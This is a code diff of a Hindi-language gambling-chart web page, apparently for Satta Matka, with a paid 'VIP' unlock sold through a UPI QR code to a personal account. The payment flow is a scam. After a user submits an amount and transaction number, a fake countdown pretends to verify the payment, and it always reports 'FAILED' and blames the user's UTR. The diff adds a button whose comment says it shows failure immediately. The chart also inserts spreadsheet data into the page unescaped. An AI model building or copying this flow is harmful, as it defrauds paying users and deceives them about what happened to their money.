@@ -9,16 +9,17 @@
         body { background: var(--bg); color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; scroll-behavior: smooth; }
         
         .header { background: #111; color: var(--gold); padding: 15px; border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 1000; }
+        .header h1 { margin: 0; font-size: 24px; }
         
         .intro-text { background: #1a1a1a; padding: 12px; margin: 15px auto; width: 88%; border: 1px solid var(--gold); font-size: 14px; color: #fff; text-align: center; font-weight: bold; line-height: 1.4; border-radius: 4px; }
         
-        .scroll-btn { background: #1a1a1a; color: #fff; padding: 8px 15px; border: 1px solid var(--gold); border-radius: 4px; cursor: pointer; margin: 10px; font-size: 12px; }
+        .scroll-btn { background: #1a1a1a; color: #fff; padding: 8px 15px; border: 1px solid var(--gold); border-radius: 4px; cursor: pointer; margin: 10px; font-size: 12px; display: inline-block; }
 
-        #chartArea { background: #fff; width: 94%; margin: 10px auto; border: 1px solid var(--grid-border); border-radius: 4px; overflow: hidden; }
-        .chart-grid { display: grid; grid-template-columns: 45px repeat(6, 1fr); width: 100%; }
+        #chartArea { background: #fff; width: 94%; margin: 10px auto; border: 1px solid var(--grid-border); border-radius: 4px; overflow-x: auto; min-height: 100px; }
+        .chart-grid { display: grid; grid-template-columns: 45px repeat(6, 1fr); width: 100%; min-width: 320px; }
         
         .day-label, .date-label { background: #000; color: var(--gold); font-weight: bold; font-size: 9px; padding: 8px 0; border: 0.5px solid var(--grid-border); }
-        .date-box { background: #f0f0f0; color: #000; font-size: 8.5px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .date-box { background: #f0f0f0; color: #000; font-size: 8.5px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; min-height: 45px; }
         
         .cell { position: relative; aspect-ratio: 1 / 1.1; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; min-height: 45px; }
         
@@ -27,21 +28,21 @@
         .panna.right { right: 1.5px; }
         .jodi { font-size: 17px; font-weight: bold; color: #000; z-index: 1; }
 
-        /* Red House & Star Logic */
         .red-house .jodi, .red-house .panna { color: #e31e24 !important; }
 
         .single-vip-lock { color: var(--gold); font-size: 22px; animation: blink 1.5s infinite; }
         @keyframes blink { 50% { opacity: 0.4; } }
 
-        .unlock-btn { background: var(--gold); color: #000; padding: 15px; border: none; width: 90%; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 18px; margin: 20px 0; }
+        .unlock-btn { background: var(--gold); color: #000; padding: 15px; border: none; width: 90%; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 18px; margin: 20px 0; display: inline-block; }
 
         .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; }
-        .modal-content { background: #111; border: 2px solid var(--gold); width: 90%; max-width: 400px; padding: 20px; border-radius: 12px; }
-        .plan-box { border: 1px solid var(--gold); margin: 12px 0; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .modal-content { background: #111; border: 2px solid var(--gold); width: 90%; max-width: 400px; padding: 20px; border-radius: 12px; color: white; }
+        .plan-box { border: 1px solid var(--gold); margin: 12px 0; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; background: #222; }
         .qr-box { margin-top: 20px; border: 1px dashed var(--gold); padding: 15px; display: none; background: #fff; color: #000; border-radius: 8px; }
         
         input { width: 85%; padding: 12px; margin: 5px; border-radius: 5px; border: 1px solid var(--gold); background: #222; color: #fff; font-size: 16px; }
         .btn-submit { background: #ffcc00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 8px; margin-top: 15px; cursor: pointer; }
+        .btn-failed { background: #e31e24; color: #fff; border: none; padding: 10px; width: 80%; font-weight: bold; border-radius: 5px; margin-top: 10px; cursor: pointer; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -64,7 +65,7 @@
         <div class="day-label">THU</div>
         <div class="day-label">FRI</div>
         <div class="day-label">SAT</div>
-        <div id="gridData" style="display:contents;">चार्ट लोड हो रहा है...</div>
+        <div id="gridData" style="display:contents; color: black;">चार्ट लोड हो रहा है...</div>
     </div>
 </div>
 
@@ -81,7 +82,7 @@
             <div class="plan-box" onclick="goToStep2('1 दिन के लिए 699')">1 दिन के लिए - ₹699</div>
             <div class="plan-box" onclick="goToStep2('7 दिन के लिए 1299')">7 दिन के लिए - ₹1299</div>
             <div class="plan-box" onclick="goToStep2('30 दिन के लिए 1799')">30 दिन के लिए - ₹1799</div>
-            <button onclick="closeVipModal()" style="color:#ccc; background:none; border:none; margin-top:10px;">बंद करें</button>
+            <button onclick="closeVipModal()" style="color:#ccc; background:none; border:none; margin-top:10px; cursor:pointer;">बंद करें</button>
         </div>
 
         <div id="modalStep2" style="display:none;">
@@ -92,16 +93,16 @@
             <div id="qrBox" class="qr-box">
                 <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=omkaryadavsonu8888-1@oksbi%26pn=Omkar%20Yadav%26cu=INR" style="width:180px;">
                 <p style="margin:5px 0; color:#000;"><b>Omkar Yadav</b></p>
-                
                 <hr style="border: 0.5px solid #ccc; margin: 10px 0;">
-                <input type="number" id="paymentAmount" placeholder="कितना पेमेंट किया? (Amount)" style="background:#fff; color:#000; border:1px solid #999;">
-                <input type="text" id="utrNumber" placeholder="UTR / Transaction ID लिखें" style="background:#fff; color:#000; border:1px solid #999;">
+                <input type="number" id="paymentAmount" placeholder="Amount" style="background:#fff; color:#000; border:1px solid #999; width: 90%;">
+                <input type="text" id="utrNumber" placeholder="UTR Number" style="background:#fff; color:#000; border:1px solid #999; width: 90%;">
                 
                 <button class="btn-submit" id="finalSubmitBtn" onclick="startVerification()">सबमिट करें (Submit)</button>
                 
-                <div id="timerSection" style="display:none; margin-top:15px; font-weight:bold; color:red;">
-                    <p id="timerMsg">पेमेंट की जांच हो रही है... कृपया प्रतीक्षा करें</p>
-                    <div id="countdown" style="font-size: 24px;">02:00</div>
+                <div id="timerSection" style="display:none; margin-top:15px; font-weight:bold;">
+                    <p id="timerMsg" style="color: blue;">पेमेंट की जांच हो रही है...</p>
+                    <div id="countdown" style="font-size: 24px; color: red;">02:00</div>
+                    <button class="btn-failed" onclick="showFailedNow()">Check Result Now</button>
                 </div>
             </div>
         </div>
@@ -110,18 +111,13 @@
 
 <script>
     let selectedPlanText = "";
-    const CSV_URL = `https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv&v=${new Date().getTime()}`;
+    let verificationTimer;
+    const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
 
     function openVipModal() { document.getElementById('vipModal').style.display = 'flex'; }
-    
     function closeVipModal() { 
-        document.getElementById('vipModal').style.display = 'none';
-        document.getElementById('modalStep1').style.display = 'block';
-        document.getElementById('modalStep2').style.display = 'none';
-        // Reset fields
-        document.getElementById('qrBox').style.display = 'none';
-        document.getElementById('timerSection').style.display = 'none';
-        document.getElementById('finalSubmitBtn').style.display = 'block';
+        document.getElementById('vipModal').style.display = 'none'; 
+        clearInterval(verificationTimer); // Timer reset
     }
     
     function goToStep2(p) { 
@@ -136,86 +132,69 @@
             return;
         }
         document.getElementById('qrBox').style.display = 'block'; 
-        document.getElementById('qrBox').scrollIntoView({behavior: 'smooth'});
     }
 
     function startVerification() {
-        let utr = document.getElementById('utrNumber').value;
-        let amount = document.getElementById('paymentAmount').value;
-
-        if(utr === "" || amount === "") {
-            alert("कृपया Amount और UTR नंबर भरें!");
-            return;
+        if(document.getElementById('utrNumber').value === "" || document.getElementById('paymentAmount').value === "") { 
+            alert("Amount और UTR भरें!"); 
+            return; 
         }
-
+        
         document.getElementById('finalSubmitBtn').style.display = 'none';
         document.getElementById('timerSection').style.display = 'block';
-
-        let timeLeft = 120; 
-        let timerElement = document.getElementById('countdown');
-
-        let downloadTimer = setInterval(function(){
+        
+        let timeLeft = 120;
+        verificationTimer = setInterval(function(){
             if(timeLeft <= 0){
-                clearInterval(downloadTimer);
-                document.getElementById('timerSection').innerHTML = "<h3 style='color:red;'>Verification Failed!</h3><p style='color:#000;'>सर्वर व्यस्त है या UTR गलत है। कृपया फिर से कोशिश करें।</p>";
+                showFailedNow();
             } else {
-                let minutes = Math.floor(timeLeft / 60);
-                let seconds = timeLeft % 60;
-                timerElement.innerHTML = (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+                let m = Math.floor(timeLeft/60), s = timeLeft%60;
+                document.getElementById('countdown').innerHTML = (m<10?"0":"")+m+":"+(s<10?"0":"")+s;
+                timeLeft--;
             }
-            timeLeft -= 1;
         }, 1000);
+    }
+
+    // Is function se turant Failed dikhayega
+    function showFailedNow() {
+        clearInterval(verificationTimer);
+        document.getElementById('timerSection').innerHTML = "<h3 style='color:red; margin-bottom:5px;'>FAILED!</h3><p style='color:black; font-size:12px;'>आपका पेमेंट वेरिफिकेशन फेल हो गया है। कृपया सही UTR नंबर के साथ फिर से कोशिश करें या एडमिन से संपर्क करें।</p><button class='btn-submit' onclick='location.reload()'>फिर से कोशिश करें</button>";
     }
 
     async function loadChart() {
         try {
-            const res = await fetch(CSV_URL);
+            const res = await fetch(CSV_URL + "&cache=" + new Date().getTime());
             const data = await res.text();
-            const rows = data.split('\n').filter(row => row.trim() !== "").map(r => r.split(','));
+            const rows = data.split('\n').map(r => r.split(','));
             let h = '';
             let lockPlaced = false;
 
             for(let i=1; i<rows.length; i++) {
-                let dateCell = (rows[i][0] || "").replace(/"/g,"").trim();
-                if(!dateCell) continue;
-                h += `<div class="date-box">${dateCell}</div>`;
-                
+                if(!rows[i][0]) continue;
+                h += `<div class="date-box">${rows[i][0].replace(/"/g,"")}</div>`;
                 for(let j=1; j<=16; j+=3) {
-                    let l = (rows[i][j] || "").trim().replace(/"/g,"");
-                    let jo = (rows[i][j+1] || "").trim().replace(/"/g,"");
-                    let r = (rows[i][j+2] || "").trim().replace(/"/g,"");
+                    let l = (rows[i][j]||"").trim().replace(/"/g,"");
+                    let jo = (rows[i][j+1]||"").trim().replace(/"/g,"");
+                    let r = (rows[i][j+2]||"").trim().replace(/"/g,"");
 
-                    if (l === "" && jo === "" && r === "") {
-                        if (!lockPlaced) {
-                            h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`;
-                            lockPlaced = true;
-                        } else {
-                            h += `<div class="cell"></div>`;
-                        }
+                    if(l==="" && jo==="" && r==="") {
+                        if(!lockPlaced) { h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`; lockPlaced=true; }
+                        else { h += `<div class="cell"></div>`; }
                     } else {
                         let isRed = false;
-                        // Red House Logic
-                        if(jo.length >= 2) {
-                            let d1 = parseInt(jo[0]), d2 = parseInt(jo[1]);
-                            if(!isNaN(d1) && !isNaN(d2) && (d1===d2 || Math.abs(d1-d2)===5)) isRed = true;
-                        }
-                        // Star Logic: Agar Jodi me '*' hai to cell red hoga
-                        if(jo.includes('*')) isRed = true;
-
-                        let redClass = isRed ? 'red-house' : '';
-                        let lh = l.split('').map(s=>`<span>${s}</span>`).join('');
-                        let rh = r.split('').map(s=>`<span>${s}</span>`).join('');
-                        h += `<div class="cell ${redClass}"><div class="panna left">${lh}</div><div class="jodi">${jo}</div><div class="panna right">${rh}</div></div>`;
+                        if(jo.length>=2 && (jo[0]===jo[1] || Math.abs(parseInt(jo[0])-parseInt(jo[1]))===5)) isRed=true;
+                        if(jo.includes('*')) isRed=true;
+                        let rc = isRed ? 'red-house' : '';
+                        h += `<div class="cell ${rc}"><div class="panna left">${l}</div><div class="jodi">${jo}</div><div class="panna right">${r}</div></div>`;
                     }
                 }
             }
             document.getElementById('gridData').innerHTML = h;
         } catch(e) { 
-            document.getElementById('gridData').innerHTML = "Error loading chart.";
+            document.getElementById('gridData').innerHTML = "Error: Check Data Connection";
         }
     }
     loadChart();
 </script>
-
 </body>
 </html>
